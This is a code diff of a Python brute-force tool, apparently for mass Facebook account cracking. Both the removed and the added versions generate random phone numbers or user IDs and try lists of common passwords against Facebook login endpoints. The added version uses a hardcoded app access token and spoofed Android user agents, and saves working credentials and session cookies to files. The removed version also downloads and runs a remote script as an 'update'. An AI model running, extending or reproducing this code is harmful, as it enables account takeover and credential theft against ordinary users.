@@ -1,206 +1,114 @@
-#coding=utf
-#DECODE BY ASAD ALI
-import os,sys,time,json,random,re,string,platform,base64
+#coding :- utf-8
+#update by :- Hamdard
+#Script Owner : Hamdard 
+#---------------------
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python ali.py')
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-logo =  """   
-    
-    :'######:::::'###::::'########::'####:'########::
-'##... ##:::'## ##::: ##.... ##:. ##:: ##.... ##:
- ##:::..:::'##:. ##:: ##:::: ##:: ##:: ##:::: ##:
-. ######::'##:::. ##: ########::: ##:: ########::
-:..... ##: #########: ##.... ##:: ##:: ##.. ##:::
-'##::: ##: ##.... ##: ##:::: ##:: ##:: ##::. ##::
-. ######:: ##:::: ##: ########::'####: ##:::. ##:
-:......:::..:::::..::........:::....::..:::::..::
- 
-══════════════════════════════════════════════════
-  Author       : Sabir
-  Brother      : Adil
-  TOOLS STATUS : free
-  Youtube      : Pro
-══════════════════════════════════════════════════"""
+	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError: 
+	os.system('pip install requests > /dev/null')
+	exit('\n Run Again ')
+#---------------------Hamdard-LOGO---------------------#
+logo ='''
+\033[1;97m.##.....##.....##.....##
+\033[1;33m.###...###.....##.....##
+\033[1;97m.####.####.....##.....##
+\033[1;23m.##.###.##.....#########
+\033[1;97m.##.....##.....##.....##
+\033[1;23m.##.....##.###.##.....##
+\033[1;97m.##.....##.###.##.....##
+\033[1;97m--------------------------------------------------
+\033[1;91m Author     :  Hamdard
+\033[1;91m WhatsApp   : +93 77 070 1498     
+\033[1;91m facebook   : Hamdard
+\033[1;91m Telegram   : Hamdard
+\033[1;91m Status     : FREE
+\033[1;97m--------------------------------------------------
+'''
 loop = 0
 oks = []
-cps = []
-try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    proxy = requests.get('https://raw.githubusercontent.com/Sabir455/SA.git/update.txt').text.splitlines()
-    v = 3.1
-    update = requests.get('https://raw.githubusercontent.com//Sabir455/SA.git/version.txt').text
-    if str(v) in update:
-        os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.co/Sabir455/SA.git/SA/main/SA.py > SA.py')
-        os.system('python Sabir.py')
-    else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
- 
-def asad():
-    os.system('clear')
-    print(logo)
-    print('[1] Random crack')
-    print(50*'-')
-    opt = input('Choose option >>> ')
-    if opt =='1':
-        random_crack()
-    else:
-        print('\n\033[1;31mChoose valid option\033[0;97m')
-def random_crack():
-    os.system('clear')
-    print(logo)
-    print('[1] Random UID crack')
-    print('[2] Random number crack')
-    print('[B] Back')
-    print(50*'-')
-    opt = input('Choose option >>> ')
-    if opt =='1':
-        random_uid()
-    elif opt =='2':
-        random_number()
-    elif opt =='3':
-        main()
-    else:
-        print('\n\033[1;31mChoose valid option\033[0;97m')
-def random_uid():
-    user=[]
-    os.system('clear')
-    print(logo)
-    limit = int(input('How many ids do you want to add ? '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(11))
-        user.append('10000'+nmp)
-    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
-    pwx = input('Put passwords: ').split(',')
-    with ThreadPool(max_workers=70) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print('Total ids: '+tl)
-        print('The process has been started')
-        print(50*'-')
-        for uid in user:
-            yaari.submit(rcrack,uid,pwx,tl)
-    print(50*'-')
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    print(50*'-')
-def random_number():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')
-    kode = input('Put code: ')
-    limit = int(input('How many numbers do you want to add ? '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=70) as yaari:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print('Total ids: '+tl)
-        print('The process has been started')
-        print(50*'-')
-        for guru in user:
-            uid = kode+guru
-            pwx = [guru]
-            yaari.submit(rcrack,uid,pwx,tl)
-    print(50*'-')
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    print(50*'-')
- 
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(proxy)
-            session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority':'web.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
-            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
-            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\033[1;32m[ASAD-OK] '+cid+' | '+ps+'\033[0;97m')
-                open('ok.txt', 'a').write(uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('\033[1;31m[Sabir-CP] '+cid+' | '+ps+'\033[0;97m')
-                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
-    except:
-        pass
- 
-sabir()
+pcp=[]
+cps=[]
+#---------------------Hamdard-MENU---------------------#
+def menu():
+	os.system('clear')
+	print(logo)
+	print('[1] Start Random Crack ')
+	print('[0] Exit Menu')
+	print(47*'-')
+	opt = input('[?] Choose : ')
+	if opt =='1':
+		afg_randome()
+	elif opt =='0':
+		menu()
+	else:
+		print('\033[1;91m [•] Choose valid option\033[0;97m')
+#---------------------Hamdard-RANDOM_CRACK---------------------#
+def afg_randome():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[+] For AFG (9379,9378,9377,9370)ETC....')
+	print(47*'-')
+	kode = input('[?] Input Code : ')
+	print(47*'-')
+	limit = int('99999')
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as ahd:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[+] Total Ids : \033[1;92m'+tl)
+		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')
+		for guru in user:
+			ids = kode+guru
+			mking_pass = [ids,guru,'100200','700800','afghanistan','afghan1234','khan123','khan12345','600700','800900','786786','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹۱۲۳۴۵۶','100200','۱۲۳۴۵۶۷۸۹','500500','700800','500600','900900','10002000','50006000','۵۰۰۶۰۰','kabul123','Afghan1234','kabul1234','afghanistan','Afghan123','janjan','afghan','Afghanistan','50005000','jan123']
+			ahd.submit(rndm,ids,mking_pass)
+	print(47*'\n\033[1;37m-')
+	print('[✓] Crack process has been completed')
+	print('[?] Total Ok Id Save in  /sdcard/Afghan-OK.txt')
+	print('[?] Total Cp Id Save in  /sdcard/Afghan-CP.txt')
+	print(47*'-')
+	print(' Press Inter To Back Menu')
+#---------------------START-CRACK---------------------#
+def rndm(ids,mking_pass):
+	try:
+		global ok,loop
+		sys.stdout.write('\r\r\033[1;37m [Saadat-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		for pas in mking_pass:
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(111111111,999999999))
+			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
+			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
+			head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
+			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = po['uid']
+				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
+				print('\r\r\033[1;32m [M.H-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
+				open('/sdcard/Afghan-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+				oks.append(str(uid))
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = po['error']['error_data']['uid']
+				print('\r\r\x1b[1;33m [M.H-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+				open('/sdcard/Afghan-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+				cps.append(str(uid))
+				break
+			else:continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+menu()
  
